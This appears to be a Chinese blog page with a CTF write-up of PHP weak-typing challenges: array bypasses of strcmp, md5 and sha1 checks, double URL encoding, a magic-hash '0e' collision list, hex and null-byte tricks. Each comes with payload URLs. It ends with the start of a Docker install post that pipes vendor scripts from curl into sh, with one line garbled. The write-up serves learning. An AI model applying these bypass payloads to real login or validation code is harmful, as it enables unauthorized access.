<h5 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span></span><br><span class="line">if (isset($_GET['a'])) &#123;</span><br><span class="line">if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'No';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到注释，如果两者相等返回0，可以使用数组，来将其判断成0</p>
<p>payload:<code>http://123.206.87.240:9009/6.php?a[]=1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084441132.png" alt="image-20200716084441132"></p>
<h5 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi("hackerDJ",$_GET[id])) &#123; echo("not allowed!");</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[id] = urldecode(<span class="variable">$_GET</span>[id]);</span></span><br><span class="line"><span class="meta">if($</span><span class="bash">_GET[id] == <span class="string">"hackerDJ"</span>)&#123;</span></span><br><span class="line">echo "Access granted!"; </span><br><span class="line">echo "flag";</span><br><span class="line">&#125;?</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到题目就已经给提示了，说了两次url编码，复制hackerDJ，在小葵工具，或者在线工具中进行两次URL编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084821436.png" alt="image-20200716084821436"></p>
<p>复制提交以下</p>
<p>payload：<code>http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084903971.png" alt="image-20200716084903971"></p>
<h5 id="MD5-函数"><a href="#MD5-函数" class="headerlink" title="MD5()函数"></a>MD5()函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if (isset($_GET['username']) and isset($_GET['password'])) &#123;</span><br><span class="line">if ($_GET['username'] == $_GET['password'])</span><br><span class="line">print 'Your password can not be your username.';</span><br><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'Invalid password';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，其中有这样一条判断，进行md5判断，要username和password全等于。所以这里要是用数组绕过，因为md5不能处理数组</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br></pre></td></tr></table></figure>

<p>payload:<code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716085249876.png" alt="image-20200716085249876"></p>
<h5 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h5><p>源码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset($_GET['name']) and isset($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'name'</span>]);</span></span><br><span class="line">echo "</span><br><span class="line">";</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'password'</span>]);</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'name'</span>]));</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'password'</span>]));</span></span><br><span class="line">if ($_GET['name'] == $_GET['password'])</span><br><span class="line">echo '</span><br><span class="line">Your password can not be your name!</span><br><span class="line">';</span><br><span class="line">else if (sha1($_GET['name']) === sha1($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Invalid password.</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Login first!</span><br><span class="line">';</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打开页面，先构造一下看看页面返回</p>
<p>如果name和password相同就会返回你的名字不能和密码相同</p>
<p>并且将用户名和密码进行md5加密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140506785.png" alt="image-20200716140506785"></p>
<p>将用户名和密码输入不同的数字，就会返回密码无效</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140702144.png" alt="image-20200716140702144"></p>
<p>审计源码</p>
<p>发现name和password进行sha()函数比较，并且要求全等于，所以就可以利用数组绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140834651.png" alt="image-20200716140834651"></p>
<h5 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">md52 = @md5(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">a))&#123;</span></span><br><span class="line">if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo "flag&#123;*&#125;";</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo "false!!!";</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo "please input a";&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打开页面，让其输入a</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142456628.png" alt="image-20200716142456628"></p>
<p>在url中输入a，审计源码发现，不能直接输入QNKCDZO</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142551180.png" alt="image-20200716142551180"></p>
<p>输入s878926199a，返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142642496.png" alt="image-20200716142642496"></p>
<p>原理：</p>
<p>​        PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而以下这些字符串，md5哈希之后都是0e开头的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a	</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<h5 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">one = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">nine = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">number = <span class="string">'3735929054'</span>;</span></span><br><span class="line">// Check all the input characters!</span><br><span class="line">	for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		// Disallow all the digits!</span><br><span class="line"><span class="meta">		$</span><span class="bash">digit = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span></span><br><span class="line">		if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">	return "flase";</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">if($</span><span class="bash">number == <span class="variable">$temp</span>)</span></span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">temp = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span></span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">deadc0de</span><br></pre></td></tr></table></figure>

<p>打开页面查看返回，页面返回空白卡</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144052143.png" alt="image-20200716144052143"></p>
<p>审计代码，数字不能是1~9，这和3735929054冲突，题目也告诉了用十六进制绕过，将3735929054进行转化，转换成十六进制，前面要加上0x，不然它不知道这个是什么。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144253333.png" alt="image-20200716144253333"></p>
<h5 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h5><p>打不开</p>
<h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"xxx"</span>;</span></span><br><span class="line">if (isset ($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">You password must be alphanumeric</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die('Flag: ' . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo('</span><br><span class="line">- have not been found</span><br><span class="line">');</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">Invalid password</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：ereg()函数搜索一个字符串中的指定字符串，成功true，错误false<br> 传入的值必须是数字或大小写字符<br> 传入的值长度小于8，但要大于9999999</p>
<p>长度和数值矛盾，采用1e8,1x10的8次方，绕过</p>
<p>在可以看到题目是%00截断绕过，可以构造一下payload查看能否返回</p>
<p>没有找到* - *。。。将 - 替换为 * - *试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145651772.png" alt="image-20200716145651772"></p>
<p>这样页面就成功的返回了flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145811973.png" alt="image-20200716145811973"></p>
<h5 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset ($_GET['ctf'])) &#123;</span><br><span class="line">if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)</span><br><span class="line">echo '必须输入数字才行';</span><br><span class="line">else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '骚年，继续努力吧啊~';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。所以输入的内容不能是正则中的内容。结合题目是数组绕过，所以跟之前的数组绕过一样，这里等号后面可以跟任何内容</p>
<p>这样进行数组绕过就成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716151013505.png" alt="image-20200716151013505"></p>
<h5 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">password = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span></span><br><span class="line">//1、正则匹配，[:graph:]为任意字符，要求password长度超过12</span><br><span class="line">	if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))&#123;</span><br><span class="line">		echo 'flag';</span><br><span class="line">		exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)&#123;</span><br><span class="line">//2、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过6次</span><br><span class="line"><span class="meta">	$</span><span class="bash">reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span></span><br><span class="line">	if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">		break;</span><br><span class="line">//c为字符种类，</span><br><span class="line"><span class="meta">	$</span><span class="bash">c = 0;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">ps = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span></span><br><span class="line">	//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]]任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">//标点符号，数字，大写字母，小写字母，包含3种以上绕过</span><br><span class="line">	foreach ($ps as $pt)&#123;</span><br><span class="line">		if (preg_match("/[[:$pt:]]+/", $password))</span><br><span class="line"><span class="meta">			$</span><span class="bash">c += 1;</span></span><br><span class="line">	&#125;</span><br><span class="line">	if ($c &lt; 3) break;</span><br><span class="line"><span class="meta">//&gt;</span><span class="bash">=3，必须包含四种类型三种与三种以上</span></span><br><span class="line">//4、弱类型比较，42abc,强制转换为数字</span><br><span class="line">	if ("42" == $password) echo $flag;</span><br><span class="line">	else </span><br><span class="line">		echo 'Wrong password';</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>preg_match()</strong></p>
<p>定义：</p>
<ul>
<li>执行一个正则表达式匹配</li>
</ul>
<p>语法：preg_math（pattern,string,matches,flags）</p>
<ul>
<li>pattern,必需，要搜索的模式</li>
<li>string,必需，输入的字符串</li>
<li>返回pattern的匹配次数，0次（不匹配）或1次，匹配成功第一次就会停止搜索。</li>
</ul>
<p><strong>preg_match_all()</strong></p>
<p>与preg_match的区别：</p>
<ul>
<li>返回匹配完整次数（可能是0），或者发生错误后返回FALSE，匹配完整个字符串。</li>
</ul>
<table>
<thead>
<tr>
<th>名字</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>[a-zA-Z0-9]</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>[a-zA-Z]</td>
</tr>
<tr>
<td>[:ascii:]</td>
<td>[\x00-\x7F]</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>[ \t]</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>[0-9]</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>[\x21-\x7E]</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~]</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>[a-z]</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>[A-Z]</td>
</tr>
<tr>
<td>[:word:]</td>
<td>[A-Za-z0-9_]</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>[A-Fa-f0-9]</td>
</tr>
</tbody></table>
<p>这一关有bug就算只输入?password=都能返回flag</p>
<p>只要能够满足条件都行，是Post传参</p>
<p>payload:<code>42ccccccc.ffffffF</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716153636587.png" alt="image-20200716153636587"></p>
<h5 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h5><p>打不开</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-docker" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/docker/" class="article-date">
  	<time datetime="2020-07-25T01:16:30.193Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/docker/">
        docker
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="docker功能描述"><a href="#docker功能描述" class="headerlink" title="docker功能描述"></a>docker功能描述</h4><p>第一步，查看内核版本，目前Docker最支持Centos7，需要安装在64位的平天上并且内核版本需要高于3.10。检查内核版本的命令如下。</p>
<p><code>uname -r</code>命令查看系统内核版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502142749009.png" alt="image-20200502142749009"></p>
<p><code>docker version</code>命令实现安装验证及版本查看</p>
<p>第二步，使用脚本自动安装Docker。脚本会自动将Docker依赖环境配置完成，并在系统中进行Docker的安装。由于Docker的软件园在国外，下载会有延迟，很有可能因为网络环境导致下载错误。为避免发生错误，可以使用国内的软件源镜像安装，比如使用阿里云安装使用DaoCloud安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用脚本自动安装Docker</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.docker.com&#x2F;1 sh </span><br><span class="line">&#x2F;&#x2F; 使用阿里云安装Docker</span><br><span class="line">curl -sSL http:&#x2F;&#x2F;acs-public-mirror.oss-cn-hangzhou.aliyuncs.com&#x2F;docker-engine&#x2F;intemet | sh</span><br><span class="line">&#x2F;&#x2F; 使用DaoCloud安装Docker</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>

<p>安装完成后，使用<code>docker --version</code>来查看docker版本</p>
<p>当前Docker版本为17.12</p>
